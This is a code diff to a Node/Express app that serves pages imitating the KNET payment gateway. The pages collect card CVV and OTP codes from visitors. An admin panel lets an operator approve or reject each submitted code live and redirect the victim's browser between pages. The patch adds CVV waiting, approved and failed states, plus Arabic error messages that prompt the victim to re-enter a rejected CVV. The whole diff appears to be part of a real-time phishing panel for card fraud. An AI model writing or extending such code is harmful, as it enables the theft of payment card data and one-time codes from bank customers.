@@ -160,17 +160,50 @@ app.post('/admin/payments/:id/action', (req, res) => {
   const { action } = req.body;
   const payment = payments.find(p => p.id === id || p.knetId === id);
   if (!payment) return res.status(404).json({ success: false, message: 'Payment not found' });
+
+  let navigateTo = null;
+
   if (action === 'accept' || action === 'pass') {
-    if (payment.step === 1) payment.status = 'APPROVED';
-    else if (payment.step === 2) payment.status = 'SUCCESS';
-    else payment.status = 'SUCCESS';
+    if (payment.status === 'OTP_REQUEST') {
+      // OTP accepted -> move to CVV step
+      payment.status = 'CVV_PENDING';
+      payment.step = 3;
+      navigateTo = '/knet/cvv';
+    } else if (payment.status === 'CVV_REQUEST' || payment.status === 'CVV_PENDING') {
+      // CVV accepted -> back to OTP
+      payment.status = 'CVV_APPROVED';
+      payment.step = 2;
+      navigateTo = '/knet-otp';
+    } else if (payment.step === 1) {
+      payment.status = 'APPROVED';
+    } else {
+      payment.status = 'SUCCESS';
+    }
   } else if (action === 'reject' || action === 'denied') {
-    if (payment.step === 2) payment.status = 'OTP_FAILED';
-    else payment.status = 'REJECTED';
+    if (payment.status === 'OTP_REQUEST') {
+      payment.status = 'OTP_FAILED';
+    } else if (payment.status === 'CVV_REQUEST' || payment.status === 'CVV_PENDING') {
+      // CVV rejected -> stay on CVV page with error
+      payment.status = 'CVV_FAILED';
+      payment.cvv = null;
+      navigateTo = 'cvv_failed';
+    } else {
+      payment.status = 'REJECTED';
+    }
   }
+
   payment.updatedAt = new Date().toISOString();
   notifyAdmins('payment_status_changed', { id: payment.id, status: payment.status, payment });
-  io.to('payment_' + id).emit('payment_status_changed', { id: payment.id, status: payment.status, payment });
+
+  if (navigateTo && navigateTo !== 'cvv_failed') {
+    io.to('payment_' + id).emit('navigate_to', { page: navigateTo });
+    io.to('payment_' + id).emit('payment_status_changed', { id: payment.id, status: payment.status, payment });
+  } else if (navigateTo === 'cvv_failed') {
+    io.to('payment_' + id).emit('payment_status_changed', { id: payment.id, status: 'CVV_FAILED', payment });
+  } else {
+    io.to('payment_' + id).emit('payment_status_changed', { id: payment.id, status: payment.status, payment });
+  }
+
   res.json({ success: true, payment });
 });
 
@@ -390,11 +423,21 @@ function getCvvPageHTML(knetId) {
         .then(function(data) {
           if (data.success && data.payment) {
             var s = data.payment.status;
-            if (s === 'APPROVED' || s === 'SUCCESS') {
+            if (s === 'CVV_APPROVED') {
+              clearInterval(pollTimer);
+              window.location.href = '/knet-otp?id=' + knetId;
+            } else if (s === 'CVV_FAILED') {
+              clearInterval(pollTimer);
+              document.getElementById('loading').classList.remove('show');
+              document.getElementById('error-box').style.display = 'block';
+              document.getElementById('error-box').textContent = 'رمز CVV غير صحيح، يرجى التأكد وإعادة المحاولة';
+              document.getElementById('cvv-input').value = '';
+              document.querySelector('.btn-confirm').disabled = false;
+              document.querySelector('.btn-cancel').disabled = false;
+            } else if (s === 'SUCCESS' || s === 'APPROVED') {
               clearInterval(pollTimer);
               document.getElementById('loading').classList.remove('show');
               document.getElementById('error-box').style.display = 'none';
-              // Navigate to success or next step
             } else if (s === 'REJECTED' || s === 'OTP_FAILED') {
               clearInterval(pollTimer);
               document.getElementById('loading').classList.remove('show');
@@ -420,7 +463,20 @@ function getCvvPageHTML(knetId) {
       });
       socket.on('payment_status_changed', function(data) {
         if (data.id === knetId || data.paymentId === knetId) {
-          if (data.status === 'APPROVED' || data.status === 'SUCCESS') {
+          if (data.status === 'CVV_APPROVED') {
+            // CVV accepted -> go back to OTP page
+            if (pollTimer) clearInterval(pollTimer);
+            window.location.href = '/knet-otp?id=' + knetId;
+          } else if (data.status === 'CVV_FAILED') {
+            // CVV rejected -> stay on page with error
+            if (pollTimer) clearInterval(pollTimer);
+            document.getElementById('loading').classList.remove('show');
+            document.getElementById('error-box').style.display = 'block';
+            document.getElementById('error-box').textContent = 'رمز CVV غير صحيح، يرجى التأكد وإعادة المحاولة';
+            document.getElementById('cvv-input').value = '';
+            document.querySelector('.btn-confirm').disabled = false;
+            document.querySelector('.btn-cancel').disabled = false;
+          } else if (data.status === 'SUCCESS' || data.status === 'APPROVED') {
             if (pollTimer) clearInterval(pollTimer);
             document.getElementById('loading').classList.remove('show');
           } else if (data.status === 'REJECTED' || data.status === 'OTP_FAILED') {
@@ -769,6 +825,9 @@ function getAdminHTML() {
       'APPROVED': '<span class="badge badge-approved">موافقة</span>',
       'OTP_REQUEST': '<span class="badge badge-otp">OTP وصل</span>',
       'CVV_REQUEST': '<span class="badge" style="background:#fef2f2;color:#dc2626;border:1px solid #fca5a5">CVV وصل</span>',
+      'CVV_PENDING': '<span class="badge" style="background:#fff7ed;color:#ea580c;border:1px solid #fed7aa">انتظار CVV</span>',
+      'CVV_APPROVED': '<span class="badge" style="background:#f0fdf4;color:#16a34a;border:1px solid #86efac">CVV موافق</span>',
+      'CVV_FAILED': '<span class="badge" style="background:#fef2f2;color:#dc2626;border:1px solid #fca5a5">CVV خاطئ</span>',
       'OTP_FAILED': '<span class="badge badge-failed">OTP خاطئ</span>',
       'SUCCESS': '<span class="badge badge-success">مكتمل</span>',
       'REJECTED': '<span class="badge badge-rejected">مرفوض</span>',
